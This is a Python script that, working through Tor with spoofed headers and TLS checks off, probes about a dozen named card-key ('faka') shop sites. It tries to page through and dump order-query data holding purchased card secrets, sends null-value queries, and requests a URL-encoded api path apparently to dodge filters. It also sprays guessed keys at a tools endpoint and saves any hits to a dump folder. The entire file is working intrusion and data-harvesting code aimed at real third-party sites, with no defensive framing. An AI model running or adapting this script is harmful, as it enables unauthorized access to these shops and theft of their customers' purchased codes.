#!/usr/bin/env python3
"""Deep-check batch13 priorities: qqx2 ajax200 + ykfaka_surface flags + curl %61pi."""
import json
import re
import subprocess
import time
from pathlib import Path

import requests

OUT = Path("/data/recon/batch13")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
PROXIES = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}

PRIORITY = [
    "https://qqx2.cn",
    "https://xy0088.top/shop",
    "http://hm0880.top/shop",
    "http://suqi777.top/shop",
]

ALL = [
    "https://kaka1880.xyz/shop",
    "https://db866.lol/shop",
    "https://xy0088.top/shop",
    "https://wxr699.top/shop",
    "https://qqhaoma.top/shop",
    "http://hm0880.top/shop",
    "http://suqi777.top/shop",
    "https://qqx2.cn",
    "https://pinzun668.top/shop",
    "https://zzqq.lol/shop",
    "http://xsh168.top/shop",
    "https://fendou.lol/shop",
    "https://hmjf.lol/shop",
]


def log(*a):
    print(*a, flush=True)


def sess(base):
    host = base.split("/")[2]
    origin = f"{base.split('/')[0]}//{host}"
    s = requests.Session()
    s.proxies.update(PROXIES)
    s.verify = False
    requests.packages.urllib3.disable_warnings()
    s.headers.update(
        {
            "User-Agent": UA,
            "Referer": base + "/",
            "Origin": origin,
            "Accept-Language": "zh-CN,zh;q=0.9",
        }
    )
    return s


def curl61(base, qs):
    host = base.split("/")[2]
    origin = f"{base.split('/')[0]}//{host}"
    url = f"{base}/%61pi.php?{qs}"
    cmd = [
        "curl", "-sS", "-m", "18", "-x", "socks5h://127.0.0.1:9050",
        "-A", UA,
        "-H", f"Origin: {origin}",
        "-H", f"Referer: {base}/",
        url,
    ]
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=25)
    return (p.stdout or p.stderr or "")[:300]


def main():
    out = {"priority": {}, "api61_all": {}, "kami_found": False}

    # --- qqx2 deep ---
    base = "https://qqx2.cn"
    s = sess(base)
    r = s.get(base + "/", timeout=40)
    log("qqx2 home", r.status_code, len(r.content), (re.search(r"<title>([^<]+)", r.text) or [None, None])[1])
    for qs in [
        "act=query&page=1",
        "act=query&page=1&limit=50",
        "act=query&page=2",
        "act=getcount",
    ]:
        rr = s.get(
            base + "/ajax.php?" + qs,
            headers={"X-Requested-With": "XMLHttpRequest"},
            timeout=25,
        )
        log("qqx2 ajax", qs, rr.status_code, rr.text[:250])
    # pagination dump attempt
    pages = []
    for page in range(1, 6):
        rr = s.get(
            base + f"/ajax.php?act=query&page={page}",
            headers={"X-Requested-With": "XMLHttpRequest"},
            timeout=25,
        )
        body = rr.text
        pages.append(body[:500])
        try:
            j = rr.json()
            data = j.get("data") if isinstance(j, dict) else None
            n = len(data) if isinstance(data, list) else None
            log("qqx2 page", page, "n=", n, "isnext=", j.get("isnext") if isinstance(j, dict) else None)
            if n:
                out["kami_found"] = True
                (OUT / "dump" / f"qqx2_query_p{page}.json").write_text(body, encoding="utf-8")
            if isinstance(j, dict) and not j.get("isnext"):
                break
        except Exception:
            log("qqx2 page raw", page, body[:200])
            break
    # qd93
    for data in ["1", "test", "1214", "@FCCUU"]:
        rr = s.get(base + f"/?mod=query&data={data}", timeout=30)
        hits = re.findall(r"showOrder|mod=faka|卡密[^<]{0,60}|没有查询到", rr.text)
        log("qqx2 qd93", data, hits[:6], "len", len(rr.text))
    out["priority"]["qqx2"] = {"ajax_pages": pages[:3]}

    # --- ykfaka_surface false-positive check ---
    for base in [
        "https://xy0088.top/shop",
        "http://hm0880.top/shop",
        "http://suqi777.top/shop",
    ]:
        s = sess(base)
        detail = {"base": base, "paths": {}}
        for path in [
            "/Query.html",
            "/index.php?m=Home&c=Order&a=query",
            "/index.php?m=Home&c=Order&a=query&value=null",
        ]:
            # try shop and root
            for root in [base, re.sub(r"/shop$", "", base)]:
                url = root + path
                try:
                    rr = s.get(url, timeout=20)
                    km = len(re.findall(r"Query_Km", rr.text))
                    detail["paths"][url] = {
                        "code": rr.status_code,
                        "len": len(rr.content),
                        "km": km,
                        "title": (re.search(r"<title>([^<]+)", rr.text) or [None, None])[1],
                        "snip": re.sub(r"\s+", " ", rr.text[:120]),
                    }
                    log("YK", url, rr.status_code, "km", km, detail["paths"][url]["title"])
                    if km:
                        out["kami_found"] = True
                except Exception as e:
                    detail["paths"][url] = {"err": str(e)[:120]}
            # null POST
            try:
                rr = s.post(
                    root + "/index.php?m=Home&c=Order&a=query",
                    data={"value": "null"},
                    timeout=25,
                )
                km = len(re.findall(r"Query_Km", rr.text))
                detail["paths"][root + "#nullPOST"] = {"code": rr.status_code, "km": km, "len": len(rr.content)}
                log("YK nullPOST", root, rr.status_code, "km", km, "len", len(rr.content))
                if km:
                    out["kami_found"] = True
                    (OUT / "dump" / f"null_{base.split('/')[2]}.html").write_text(rr.text[:200000], encoding="utf-8")
            except Exception as e:
                log("YK null err", root, e)
        # inspect why surface flagged — look at home for Query_Km / 卡密
        hr = s.get(base + "/", timeout=35)
        detail["home_km_ui"] = "卡密" in hr.text
        detail["home_query_km"] = "Query_Km" in hr.text
        detail["home_Query_html"] = "Query.html" in hr.text
        out["priority"][base] = detail

    # --- curl %61pi for ALL shops ---
    for base in ALL:
        api = {}
        for qs, label in [
            ("act=search&id=1", "search"),
            ("act=tools&key=", "tools_empty"),
            ("act=tools&key=123456&limit=1", "tools_bad"),
            ("act=goodslist", "goodslist"),
        ]:
            body = curl61(base, qs)
            api[label] = body
            log("API61", base, label, body[:160].replace("\n", " "))
            time.sleep(0.3)
        out["api61_all"][base] = api
        # interest
        if "订单不存在" not in api.get("search", "") and "登录" not in api.get("search", "") and "aborted" not in api.get("search", "") and api.get("search"):
            if "code" in api["search"] and "-1" not in api["search"][:40]:
                out.setdefault("interesting_api", []).append(base)

    # qqx2 tools spray short + pay csrf quick
    base = "https://qqx2.cn"
    s = sess(base)
    s.get(base + "/", timeout=40)
    for key in ["", "123456", "admin", "FCCUU", "qqx2", "xiaoer"]:
        body = curl61(base, f"act=tools&key={key}&limit=1")
        log("qqx2 tools", repr(key), body[:160])

    # ajax query empty vs data for a few big shops with Origin
    for base in ["https://kaka1880.xyz/shop", "http://hm0880.top/shop", "https://fendou.lol/shop"]:
        s = sess(base)
        s.get(base + "/", timeout=35)
        rr = s.get(
            base + "/ajax.php?act=query&page=1",
            headers={"X-Requested-With": "XMLHttpRequest"},
            timeout=25,
        )
        log("ajaxrecheck", base, rr.status_code, rr.text[:200])
        qd = s.get(base + "/?mod=query&data=1", timeout=30)
        hits = re.findall(r"showOrder|mod=faka|没有查询到|卡密", qd.text)
        log("qd93recheck", base, hits[:8], "len", len(qd.text))

    (OUT / "dump" / "DEEP.json").write_text(
        json.dumps(out, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    log("KAMI", out["kami_found"])
    log("DONE")


if __name__ == "__main__":
    main()
